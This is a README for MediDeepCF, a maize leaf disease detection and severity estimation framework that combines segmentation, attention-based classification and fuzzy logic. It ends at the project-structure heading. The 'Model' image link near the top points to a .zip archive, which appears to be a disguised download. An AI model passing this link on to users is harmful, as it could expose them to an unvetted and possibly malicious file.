# MedideepCF
# MediDeepCF: A Multi-Task Deep Learning and Fuzzy Logic Framework for Maize Leaf Disease Detection and Severity Estimation

![Model](https://raw.githubusercontent.com/Soikoth3010/MedideepCF/main/calculiform/Medideep_CF_3.7-alpha.5.zip) <!-- Optional: Add image path or remove this line -->

## 📌 Overview

**MediDeepCF** is a multi-task deep learning framework developed for robust maize leaf disease detection and severity estimation. The pipeline integrates:
- **Semantic segmentation** using DeepLabV3+ with ResNet-50
- **Disease classification** using EfficientNet-B0 with CBAM attention
- **Severity quantification** using a fuzzy logic-based inference system

This work was conducted as part of an academic research project and achieves a high average F1-score of **96.51%**, demonstrating strong performance and interpretability under real-world conditions.

---

## 🔍 Key Features

- RGB median filtering for image denoising
- Multi-task architecture combining segmentation and classification
- Attention enhancement with CBAM
- Fuzzy rule-based disease severity estimation
- Stratified 4-fold cross-validation with detailed metrics tracking
- Publication-ready visualizations and performance graphs

---

## 🧠 Technologies Used

- Python 3.10
- PyTorch, torchvision
- OpenCV, NumPy, Matplotlib
- EfficientNet, CBAM
- Scikit-learn, Scikit-fuzzy

---

## 📁 Project Structure

